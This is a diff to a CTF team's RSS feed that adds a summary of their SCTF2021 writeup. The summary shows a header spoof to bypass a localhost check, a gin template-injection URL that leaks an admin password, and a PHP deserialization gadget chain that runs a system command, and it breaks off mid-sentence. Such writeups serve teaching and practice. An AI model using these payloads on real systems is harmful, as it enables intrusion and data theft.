@@ -6,7 +6,22 @@
     <description>Recent content in Writeup on or4nge</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Thu, 23 Dec 2021 22:23:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 28 Dec 2021 16:23:17 +0800</lastBuildDate><atom:link href="https://or4ngesec.github.io/categories/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>SCTF2021 Writeup by or4nge</title>
+      <link>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</link>
+      <pubDate>Tue, 28 Dec 2021 16:23:17 +0800</pubDate>
+      
+      <guid>https://or4ngesec.github.io/post/sctf2021-writeup-by-or4nge/</guid>
+      <description>Web loginme 第一步绕过本地验证，x-forwarded-for 和 client-ip 被过滤了，X-Real-IP:127.0.0.1 绕过
+第二步是 gin 的模板注入，让 id 为一个不存在的值，age 为 {{.Password}} 就可以获得 admin 结构体中的 Password 变量值了。
+http://124.71.166.197:18001/admin/index?id=5&amp;amp;age={{.Password}}
+Upload_it 可以任意上传 /tmp 目录下文件， 可以直接写进 session 文件。查看 phpinfo 发现 session 的处理器是 php，于是可以把 upload_path|$serialize 写进 /tmp/sess_or4nge，然后改自己的 session_id 为 or4nge，即可触发反序列化。
+利用给的Composer.json：
+&amp;#34;symfony/string&amp;#34;: &amp;#34;^5.3&amp;#34;, &amp;#34;opis/closure&amp;#34;: &amp;#34;^3.6&amp;#34; 结合出题人发布的文章https://www.anquanke.com/post/id/217929#h2-3找到一条链，其中lazystring的任意无参数函数调用接的是闭包函数 __invoke，可以将闭包函数序列化进去。
+&amp;lt;?php namespace Symfony\Component\String{ require &amp;#34;path\to\autoload.php&amp;#34;; class LazyString{ private $value; public function __construct() { $func = function(){system(&amp;#34;cat /flag&amp;#34;);}; $d = new \Opis\Closure\SerializableClosure($func); $this-&amp;gt;value = $d; } } class UnicodeString{ protected $string = &amp;#39;&amp;#39;; public function __construct() { $this-&amp;gt;string=new LazyString; } } } namespace { $exp=print(urlencode(serialize(new Symfony\Component\String\UnicodeString()))); } 其实这条链本地没有打通，原因是因为在 UnicodeString.</description>
+    </item>
+    
     <item>
       <title>KCTF2021 Fall Writeup by or4nge</title>
       <link>https://or4ngesec.github.io/post/kctf2021-fall-writeup-by-or4nge/</link>
